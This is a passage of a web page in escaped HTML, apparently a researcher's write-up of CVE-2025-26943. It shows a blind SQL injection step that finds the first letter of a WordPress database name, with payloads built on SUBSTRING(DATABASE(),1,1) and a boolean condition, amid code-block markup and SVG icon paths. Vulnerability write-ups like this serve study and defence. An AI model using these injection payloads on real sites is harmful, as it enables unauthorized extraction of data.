\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003ch3 id=\"get-first-letter-of-database-name\" class=\"headerLink\"\u003e\n    \u003ca href=\"#get-first-letter-of-database-name\" class=\"header-mark\"\u003e\u003c/a\u003e43.2 Get First Letter of Database Name\u003c/h3\u003e\u003cp\u003eA prerequisite to dumping data is being able to extract a single character of the database name; once you can obtain one character, you can typically extract the rest.\u003c/p\u003e\n\u003cblockquote\u003e\n  \u003cp\u003eIn my test environment the database name is \u003cstrong\u003ewordpress\u003c/strong\u003e, so the first character is \u003ccode\u003ew\u003c/code\u003e.\u003c/p\u003e\n\n\u003c/blockquote\u003e\u003cfigure\u003e\u003cimg src=\"/2025-09-23-cve-2025-26943/first_letter.png\"\n    alt=\"First letter\"\u003e\u003cfigcaption\u003e\n      \u003cp\u003eFirst letter\u003c/p\u003e\n    \u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cp\u003eA payload checking \u003ccode\u003eSUBSTRING(DATABASE(),1,1)='w'\u003c/code\u003e returns data normally, confirming the first letter is \u003ccode\u003ew\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-open show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"\u003esql\u003c/p\u003e\n      \u003c/button\u003e\n\n   \u003cdiv class=\"tw-flex\"\u003e\n      \u003cbutton \n        class=\"\n          line-number-button\n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.show-line-numbers]:tw-text-fgColor-link \n          print:!tw-hidden\" \n        title=\"Toggle line numbers\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 